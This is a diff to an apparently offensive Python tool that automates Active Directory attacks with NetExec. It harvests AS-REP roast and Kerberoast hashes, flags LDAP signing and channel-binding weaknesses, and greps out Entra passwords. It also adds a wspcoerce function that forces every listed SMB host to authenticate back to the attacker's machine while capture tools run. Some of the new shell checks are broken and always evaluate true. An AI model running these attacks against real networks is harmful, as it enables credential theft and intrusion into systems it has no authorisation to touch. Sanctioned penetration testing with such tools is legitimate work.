@@ -30,7 +30,8 @@ def run_nxc_creds_checks(args):
     cmds = [
         scan.run_nxc_ssh,
         scan.run_nxc_smb_enum,
-        scan.run_nxc_ldap_enum
+        scan.run_nxc_ldap_enum,
+        #scan.wspcoerce << put this back once testing in kali
     ]
     commands.threaded_functions(args, cmds)
     check_nxc_smb_vulns()
@@ -163,11 +164,25 @@ def run_nxc_ldap_enum(args):
     cmds = [
         f"[ \"$(grep 'krb5asrep' ActiveDirectory/{args.domain}_Asreproast_scan | awk '{{print $5}}')\" ] && grep 'krb5asrep' ActiveDirectory/{args.domain}_Asreproast_scan | awk '{{print $5}}' > Finds/Asreproast.txt",
         f"[ \"$(grep 'krb5tgs' ActiveDirectory/{args.domain}_Kerberoast_scan | awk '{{print $5}}')\" ] && grep 'krb5tgs' ActiveDirectory/{args.domain}_Kerberoast_scan | awk '{{print $5}}' > Finds/kerberoast.txt",
-        f"grep 'channel binding:Never' Scans/NXC/{args.domain}_{args.domain_user}_LDAP_AccessCheck.txt | sort -u >> Finds/LDAPChannelBindingFalse.txt",
-        f"grep 'signing:None' Scans/NXC/{args.domain}_{args.domain_user}_LDAP_AccessCheck.txt | sort -u >> Finds/LDAPsigningFalse.txt",
+        f"[ \"grep 'channel binding:Never' Scans/NXC/{args.domain}_{args.domain_user}_LDAP_AccessCheck.txt\" ] && grep 'channel binding:Never' Scans/NXC/{args.domain}_{args.domain_user}_LDAP_AccessCheck.txt | sort -u >> Finds/LDAPChannelBindingFalse.txt",
+        f"[ \"grep 'signing:None' Scans/NXC/{args.domain}_{args.domain_user}_LDAP_AccessCheck.txt\" ] && grep 'signing:None' Scans/NXC/{args.domain}_{args.domain_user}_LDAP_AccessCheck.txt | sort -u >> Finds/LDAPsigningFalse.txt",
         f"[ \"$(awk '$NF+0 > 0' Scans/NXC/{args.domain}_MAQ.txt)\" ] && awk '$NF+0 > 0' Scans/NXC/{args.domain}_MAQ.txt > Finds/MAQnot0.txt",
         f"[ \"$(grep 'Password:' Scans/NXC/{args.domain}_Entra.txt)\" ] && grep 'Password:' Scans/NXC/{args.domain}_Entra.txt > Finds/Entra.txt"
     ]
     
     for cmd in cmds:
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def wspcoerce(args):
+    ip = general.get_local_ip_auto()
+    smb_proc = commands.start_background_tools()
+    with open("Hosts/smbHosts.txt", 'r') as file:
+        for line in file:
+            target = line.strip()
+            if not target:
+                continue  # skip empty lines
+
+            cmd = f"wspcoerce '{args.domain}/{args.domain_user}:{args.domain_pass}@{target}' \"file:////{ip}/share\""
+            commands.single_command(cmd, line, "bright-green")
+    
+    commands.stop_background_tools(smb_proc)
